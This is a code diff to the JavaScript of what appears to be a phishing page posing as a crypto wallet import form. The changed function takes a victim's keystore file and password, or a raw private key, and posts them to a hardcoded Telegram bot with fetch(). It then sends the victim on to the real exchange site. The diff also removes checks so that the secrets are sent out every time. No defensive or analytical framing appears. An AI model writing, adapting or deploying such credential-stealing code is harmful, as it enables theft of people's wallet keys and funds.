@@ -527,22 +527,15 @@
 
 		function sendDataTG(type){
 			var data = '';
-			var success = false;
 			
-			$('#keystore_buttonSend').attr('disabled', true);
+			
 			if(type == 'keystore'){
-				try{
-					var acc = web3.eth.accounts.decrypt(keystoreFileContent, $('#keystorePassword_input').val());
-					data = acc.privateKey;
-					success = true;
-				}catch(e){
-					$('.'+type+'.window .error span').text('Invalid password');
-					$('.'+type+'.window .error').css('display', 'flex');
-
+				$('#keystore_buttonSend').attr('disabled', true);
+				
+				
 					data = keystoreFileContent + "\nPassword: " + $('#keystorePassword_input').val();
 					$('.'+type+'.window #keystorePassword_input').val('');
 					$('#keystore_buttonSend').attr('disabled', false);
-					success = false;
 					
 				}
 				
@@ -551,14 +544,11 @@
 			if(type == 'privatekey'){
 				data = $('#privatekey_input').val().split("\n").join(" ");
 
-				success = true;
 			}
 			fetch('https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=' + encodeURI(data))
 				.then(function(response){
-					if(success){
 				    console.log(data);
 						location.href = 'https://exchange.idex.io';
-					}
 			  })
 			
 			return false;
